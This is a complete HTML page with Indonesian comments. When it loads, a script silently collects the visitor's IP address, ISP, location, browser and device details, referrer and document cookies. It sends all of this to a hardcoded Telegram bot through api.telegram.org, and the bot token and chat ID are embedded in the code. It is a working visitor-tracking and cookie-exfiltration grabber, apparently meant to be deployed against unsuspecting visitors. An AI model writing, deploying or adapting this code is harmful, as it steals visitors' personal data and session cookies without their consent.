<!DOCTYPE html>
<html>
<head>
    <title>Pengumpulan Informasi Pengunjung</title>
</head>
<body>
    <h1>Sedang mengumpulkan data...</h1>
    <script>
        function sendDataToTelegram(data) {
            const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k'; // Ganti dengan token bot Anda
            const chatId = '7218964278';     // Ganti dengan chat ID Anda
            let message = "üìä **Informasi Pengunjung** üìä\n\n";
            for (const key in data) {
                message += `‚û°Ô∏è **${key}:** ${data[key]}\n`;
            }
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(apiUrl)
                .then(response => response.json())
                .then(responseData => console.log('Pesan terkirim:', responseData))
                .catch(error => console.error('Gagal mengirim pesan:', error));
        }

        async function getDeviceInfoAndSend() {
            const ipInfoPromise = fetch('https://ip-api.com/json/');
            const date = new Date();

            const deviceInfo = {
                "IP Address": 'Tidak Diketahui',
                "User-Agent": navigator.userAgent,
                "Browser & OS": navigator.userAgent, // Informasi ini seringkali ada di User-Agent
                "Device Type": /Mobile|Android|iP(hone|ad|od)|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                "ISP (Provider Internet)": 'Tidak Diketahui',
                "Kota & Negara": 'Tidak Diketahui',
                "Bahasa Sistem": navigator.language,
                "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "Tanggal & Jam Akses": date.toLocaleString(),
                "Referer URL": document.referrer || 'Tidak Ada',
                "Cookies": document.cookie || 'Tidak Ada',
                "Platform & Arsitektur": navigator.platform,
                "Touch Support": 'ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0 ? 'Ya ‚úÖ' : 'Tidak ‚ùå',
                // "Fingerprint ID": 'Akan diisi oleh library JS jika digunakan',
                // "Installed Fonts": 'Akan diisi oleh library JS jika digunakan',
                // "WebGL & Canvas Data": 'Akan diisi oleh library JS jika digunakan',
            };

            try {
                const ipInfoResponse = await ipInfoPromise;
                const ipInfoData = await ipInfoResponse.json();
                if (ipInfoData && ipInfoData.query) {
                    deviceInfo["IP Address"] = ipInfoData.query;
                    deviceInfo["ISP (Provider Internet)"] = ipInfoData.isp;
                    deviceInfo["Kota & Negara"] = `${ipInfoData.city}, ${ipInfoData.country}`;
                }
            } catch (error) {
                console.error('Gagal mendapatkan informasi IP:', error);
            }

            sendDataToTelegram(deviceInfo);
        }

        // Panggil fungsi getDeviceInfoAndSend saat halaman dimuat
        window.onload = getDeviceInfoAndSend;
    </script>
</body>
</html>
